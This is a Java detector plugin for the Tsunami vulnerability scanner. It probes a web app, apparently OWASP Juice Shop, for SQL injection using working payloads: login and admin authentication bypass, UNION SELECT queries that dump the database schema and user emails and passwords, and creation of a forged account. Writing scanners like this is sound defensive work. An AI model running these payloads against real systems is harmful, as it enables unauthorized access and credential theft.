/*
 * Copyright 2024 Lukas Pirch
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package com.google.tsunami.plugins.raid;

import static com.google.common.base.Preconditions.checkNotNull;
import static com.google.common.collect.ImmutableList.toImmutableList;
import static java.lang.String.format;

import com.google.common.collect.ImmutableList;
import com.google.common.flogger.GoogleLogger;
import com.google.inject.Inject;
import com.google.protobuf.util.Timestamps;
import com.google.protobuf.ByteString;
import com.google.tsunami.common.net.http.HttpClient;
import com.google.tsunami.common.net.http.HttpResponse;
import com.google.tsunami.common.net.http.HttpRequest;
import com.google.tsunami.common.data.NetworkServiceUtils;
import com.google.tsunami.common.time.UtcClock;
import com.google.tsunami.plugin.annotations.PluginInfo;
import com.google.tsunami.plugin.PluginType;
import com.google.tsunami.plugin.VulnDetector;
import com.google.tsunami.proto.DetectionReport;
import com.google.tsunami.proto.DetectionReportList;
import com.google.tsunami.proto.DetectionStatus;
import com.google.tsunami.proto.NetworkService;
import com.google.tsunami.proto.Severity;
import com.google.tsunami.proto.TargetInfo;
import com.google.tsunami.proto.Vulnerability;
import com.google.tsunami.proto.VulnerabilityId;
import com.google.tsunami.common.net.http.HttpHeaders;

import java.io.IOException;
import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;
import java.time.Instant;
import java.time.Clock;
import java.util.regex.Pattern;
import java.util.regex.Matcher;

@PluginInfo(
    type = PluginType.VULN_DETECTION,
    name = "SqlinjectiondetectorDetector",
    version = "0.1",
    description = "Detects SqlInjectionDetector vulnerability.",
    author = "Joscha, Elena the Debug Dingos",
    bootstrapModule = SqlinjectiondetectorDetectorBootstrapModule.class)
public final class SqlinjectiondetectorDetector implements VulnDetector {
  private static final GoogleLogger logger = GoogleLogger.forEnclosingClass();
  private final HttpClient httpClient;
  private final Clock utcClock;
  private String token = "";

  @Inject
  public SqlinjectiondetectorDetector(HttpClient httpClient, @UtcClock Clock utcClock) {
    this.httpClient = httpClient;
    this.utcClock = checkNotNull(utcClock);
  }

  @Override
  public DetectionReportList detect(
      TargetInfo targetInfo, ImmutableList<NetworkService> matchedServices) {
    logger.atInfo().log("Starting detection for Sqlinjectiondetector Detector");
    return DetectionReportList.newBuilder()
        .addAllDetectionReports(
            matchedServices.stream()
                .filter(this::isServiceVulnerable)
                .map(networkService -> buildDetectionReport(targetInfo, networkService))
                .collect(toImmutableList()))
        .build();
  }

  private boolean isServiceVulnerable(NetworkService networkService) {
    String targetUri = NetworkServiceUtils.buildWebApplicationRootUrl(networkService);
    int successfulAttacks = 0;
    
    try {
        HttpHeaders headers = HttpHeaders.builder()
            .addHeader("Accept", "application/json")
            .addHeader("Content-Type", "application/json")
            .build();
        
        // Test 1: Basic authentication bypass
        if (testAuthenticationBypass(targetUri, headers, networkService)) {
            successfulAttacks++;
        }
        
        // Test 2: Admin login bypass
        if (testAdminLoginBypass(targetUri, headers, networkService)) {
            successfulAttacks++;
        }
        
        // Test 3: Schema exfiltration
        if (testSchemaExfiltration(targetUri, headers, networkService)) {
            successfulAttacks++;
        }
        
        // Test 4: User credentials retrieval
        if (testUserCredentialsRetrieval(targetUri, headers, networkService)) {
            successfulAttacks++;
        }
        
        // Test 5: Product enumeration (including deleted)
        if (testProductEnumeration(targetUri, headers, networkService)) {
            successfulAttacks++;
        }
        
        // Test 6: Non-existing user creation
        if (testNonExistingUserCreation(targetUri, headers, networkService)) {
            successfulAttacks++;
        }
        
        return successfulAttacks > 0;
        
    } catch (IOException e) {
        logger.atWarning().log(
            format("SQL injection test failed on '%s': %s", networkService, e.getMessage()));
        return false;
    }
}

private boolean testAuthenticationBypass(String targetUri, HttpHeaders headers, NetworkService networkService) throws IOException {
    String loginPayload = "{\"email\":\"' or 1=1--\",\"password\":\"test\"}";
    
    HttpResponse response = httpClient.send(
        HttpRequest.post(targetUri + "/api/Users/login")
            .setHeaders(headers)
            .setRequestBody(ByteString.copyFromUtf8(loginPayload))
            .build(),
        networkService);
    
    if (response.status().code() == 200) {
        String responseBody = response.bodyBytes()
            .map(bs -> bs.toStringUtf8())
            .orElse("");
        return responseBody.contains("token") || responseBody.contains("authentication");
    }
    return false;
}

private boolean testAdminLoginBypass(String targetUri, HttpHeaders headers, NetworkService networkService) throws IOException {
    String loginPayload = "{\"email\":\"admin@juice-sh.op'--\",\"password\":\"test\"}";
    
    HttpResponse response = httpClient.send(
        HttpRequest.post(targetUri + "/api/Users/login")
            .setHeaders(headers)
            .setRequestBody(ByteString.copyFromUtf8(loginPayload))
            .build(),
        networkService);
    
    if (response.status().code() == 200) {
        String responseBody = response.bodyBytes()
            .map(bs -> bs.toStringUtf8())
            .orElse("");
        return responseBody.contains("token") && responseBody.contains("admin");
    }
    return false;
}

private boolean testSchemaExfiltration(String targetUri, HttpHeaders headers, NetworkService networkService) throws IOException {
    String payload = "qwert')) UNION SELECT sql, '2', '3', '4', '5', '6', '7', '8', '9' FROM sqlite_master--";
    
    HttpResponse response = httpClient.send(
        HttpRequest.get(
            targetUri + "/rest/products/search?q="
                + URLEncoder.encode(payload, StandardCharsets.UTF_8))
            .setHeaders(headers)
            .build(),
        networkService);
    
    if (response.status().code() == 200) {
        String responseBody = response.bodyBytes()
            .map(bs -> bs.toStringUtf8())
            .orElse("");
        return responseBody.contains("CREATE TABLE") || responseBody.contains("sqlite_master");
    }
    return false;
}

private boolean testUserCredentialsRetrieval(String targetUri, HttpHeaders headers, NetworkService networkService) throws IOException {
    String payload = "qwert')) UNION SELECT id, email, password, '4', '5', '6', '7', '8', '9' FROM Users--";
    
    HttpResponse response = httpClient.send(
        HttpRequest.get(
            targetUri + "/rest/products/search?q="
                + URLEncoder.encode(payload, StandardCharsets.UTF_8))
            .setHeaders(headers)
            .build(),
        networkService);
    
    if (response.status().code() == 200) {
        String responseBody = response.bodyBytes()
            .map(bs -> bs.toStringUtf8())
            .orElse("");
        Pattern emailPattern = Pattern.compile("[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\\.[A-Za-z]{2,}");
        Matcher m = emailPattern.matcher(responseBody);
        return m.find() && (responseBody.contains("password") || responseBody.contains("hash"));
    }
    return false;
}

private boolean testProductEnumeration(String targetUri, HttpHeaders headers, NetworkService networkService) throws IOException {
    String payload = "'))--";
    
    HttpResponse normalResponse = httpClient.send(
        HttpRequest.get(
            targetUri + "/rest/products/search?q=test")
            .setHeaders(headers)
            .build(),
        networkService);
    
    HttpResponse injectedResponse = httpClient.send(
        HttpRequest.get(
            targetUri + "/rest/products/search?q="
                + URLEncoder.encode(payload, StandardCharsets.UTF_8))
            .setHeaders(headers)
            .build(),
        networkService);
    
    if (normalResponse.status().code() == 200 && injectedResponse.status().code() == 200) {
        String normalBody = normalResponse.bodyBytes().map(bs -> bs.toStringUtf8()).orElse("");
        String injectedBody = injectedResponse.bodyBytes().map(bs -> bs.toStringUtf8()).orElse("");
        
        // Check if injected response returns more products (including deleted ones)
        return injectedBody.length() > normalBody.length() && 
               (injectedBody.contains("Christmas") || injectedBody.contains("2014"));
    }
    return false;
}

private boolean testNonExistingUserCreation(String targetUri, HttpHeaders headers, NetworkService networkService) throws IOException {
    String payload = "' UNION SELECT * FROM (SELECT 15 as 'id', '' as 'username', 'acc0unt4nt@juice-sh.op' as 'email', '12345' as 'password', 'accounting' as 'role', '0' as 'deluxeToken', '1.2.3.4' as 'lastLoginIp', 'profile.jpg' as 'profileImage', 'default.jpg' as 'totpSecret', 'Y' as 'isActive', '2014-01-01 00:00:00.000 +00:00' as 'createdAt', '2014-01-01 00:00:00.000 +00:00' as 'updatedAt', null as 'deletedAt') --";
    String loginPayload = "{\"email\":\"" + payload + "\",\"password\":\"12345\"}";
    
    HttpResponse response = httpClient.send(
        HttpRequest.post(targetUri + "/api/Users/login")
            .setHeaders(headers)
            .setRequestBody(ByteString.copyFromUtf8(loginPayload))
            .build(),
        networkService);
    
    if (response.status().code() == 200) {
        String responseBody = response.bodyBytes()
            .map(bs -> bs.toStringUtf8())
            .orElse("");
        return responseBody.contains("token") && 
               (responseBody.contains("accounting") || responseBody.contains("acc0unt4nt"));
    }
    return false;
}

  private DetectionReport buildDetectionReport(
      TargetInfo targetInfo, NetworkService vulnerableNetworkService) {
    return DetectionReport.newBuilder()
        .setTargetInfo(targetInfo)
        .setNetworkService(vulnerableNetworkService)
        .setDetectionTimestamp(
            Timestamps.fromMillis(Instant.now(utcClock).toEpochMilli()))
        .setDetectionStatus(DetectionStatus.VULNERABILITY_VERIFIED)
        .setVulnerability(
            Vulnerability.newBuilder()
                .setMainId(
                    VulnerabilityId.newBuilder()
                        .setPublisher("TSUNAMI_COMMUNITY")
                        .setValue("SQLINJECTIONDETECTOR_VULNERABILITY"))
                .setSeverity(Severity.CRITICAL)
                .setTitle("SqlInjectionDetector Vulnerability Exposed")
                .setDescription("The application is vulnerable to SqlInjectionDetector attacks.")
                .setRecommendation(
                    "Implement proper input validation, use parameterized queries, and apply the principle of least privilege for database access"))
        .build();
  }
  
  public ImmutableList<Vulnerability> getAdvisories() {
    return ImmutableList.of(
        Vulnerability.newBuilder()
            .setMainId(
                VulnerabilityId.newBuilder()
                    .setPublisher("TSUNAMI_COMMUNITY")
                    .setValue("SQLINJECTIONDETECTOR_VULNERABILITY"))
            .setSeverity(Severity.CRITICAL)
            .setTitle("SqlInjectionDetector Vulnerability Exposed")
            .setDescription(
                "The application is vulnerable to SqlInjectionDetector attacks.")
            .setRecommendation(
                "Implement proper input validation, use parameterized queries, and apply the principle of least privilege for database access")
        .build());
  }
}